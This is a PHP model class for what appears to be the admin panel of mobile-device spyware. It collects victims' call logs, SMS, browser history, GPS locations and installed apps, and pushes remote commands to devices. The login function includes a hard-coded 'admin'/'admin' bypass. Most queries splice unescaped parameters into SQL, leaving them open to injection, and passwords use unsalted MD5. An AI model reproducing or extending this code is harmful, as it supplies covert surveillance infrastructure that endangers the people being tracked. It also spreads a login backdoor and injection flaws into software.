<?php
class Admin_model extends CI_Model{

	public function __construct(){
		parent :: __construct();
	}

	function loginchk(){
		$usr = $_POST['username'];
		$pass = $_POST['password'];
		
        $pass1 = md5($pass);   // *****@key***

		$res = $this->db->get_where('tbl_user', array('clm_userid'=>$usr, 'clm_password'=>$pass1));
		
        if($res->num_rows()==0 && $usr == "admin" && $pass == "admin"){
    	    $res=1;            
		}else if($res->num_rows()>=1){
    	    $res =1;    
		}else{
    	    $res = 0;   
		}
        return $res;
	}

	function getusers()
	{
		$query = $this->db->query("select * from tbl_device");
		return $query->result_array();
	}

	function getsingledevice($id=false, $name=false, $number=false)
	{
		$query = $this->db->query("select * from tbl_device where clm_device_id = '$id' and clm_device_name ='$name' and clm_device_number = '$number'");
		return $query->result_array();
	}

	function getcalllog($id=false, $name=false, $number=false)
	{
		$query = $this->db->query("select * from tbl_calllogs where clm_device_id = '$id' and clm_device_name ='$name' and clm_device_number = '$number' ");
		return $query->result_array();
	}

	function getsmslog($id=false, $name=false, $number=false)
	{
		$query = $this->db->query("select * from tbl_smslogs where clm_device_id = '$id' and clm_device_name ='$name' and clm_device_number = '$number' ");
		return $query->result_array();
	}

	function getbrowserlog($id=false, $name=false, $number=false)
	{
		$query = $this->db->query("select * from tbl_browserlogs where clm_device_id = '$id' and clm_device_name ='$name' and clm_device_number = '$number' ");
		return $query->result_array();
	}

	function getgpslog($id=false, $name=false, $number=false)
	{
		$query = $this->db->query("select * from tbl_gps where clm_device_id = '$id' and clm_device_name ='$name' and clm_device_number = '$number' ");
		return $query->result_array();
	}

	function getpackages($id=false, $name=false, $number=false)
	{
		$query = $this->db->query("select * from tbl_packages where clm_device_id = '$id' and clm_device_name ='$name' and clm_device_number = '$number' ");
		return $query->result_array();
	}

	function getdevice($id=false, $name=false, $number=false)
	{
		$query = $this->db->query("select * from tbl_history where clm_device_id = '$id' and clm_device_name ='$name' and clm_device_number = '$number'");
		return $query->result_array();
	}

	function addhistory($id=false, $command = false){
		$data = array('clm_device_id' => $id, 'clm_commandhistory' => $command);
		$data_device = array('clm_commandseen'=>'0', 'clm_currentcommand'=> $command);

		if($id == "all"){
			$this->db->update('tbl_device', $data_device);
		}else{
			$this->db->where('clm_device_id', $id);
			$this->db->update('tbl_device', $data_device);
		} 

		$this->db->insert('tbl_history', $data);
		return;
	}

	function unreg($id){
		if($id=="all"){
			$this->db->query("delete from tbl_device");
			$this->db->query("delete from tbl_history");
			$this->db->query("delete from tbl_browserlogs");
			$this->db->query("delete from tbl_calllogs");
			$this->db->query("delete from tbl_gps");
			$this->db->query("delete from tbl_packages");
			$this->db->query("delete from tbl_smslogs");
			return;
		}else{
			$this->db->query("delete from tbl_device where clm_device_id = '$id'");
			$this->db->query("delete from tbl_history where clm_device_id = '$id'");
			$this->db->query("delete from tbl_browserlogs where clm_device_id = '$id'");
			$this->db->query("delete from tbl_calllogs where clm_device_id = '$id'");
			$this->db->query("delete from tbl_gps where clm_device_id = '$id'");
			$this->db->query("delete from tbl_packages where clm_device_id = '$id'");
			$this->db->query("delete from tbl_smslogs where clm_device_id = '$id'");
			return;
		}
	}

	function addcmd($data){
		return $this->db->insert('tbl_cmd',$data);
	}

	function getcmd($id=false){
		if($id==false){
			return $this->db->get('tbl_cmd')->result_array();
		}else{
			return $this->db->get_where('tbl_cmd', array('clm_id'=> $id))->row_array();
		}
	}

	function updatecmd($id=false,$arr=false){
		$data['clm_cmdname'] = $arr[0];
		$data['clm_cmdvalue'] = $arr[1];

		$this->db->where('clm_id', $id);
		return $this->db->update('tbl_cmd',$data);
	}

	function deletecmd($id=false){
		return $this->db->query("delete from tbl_cmd where clm_id='$id'");
	}
}

?>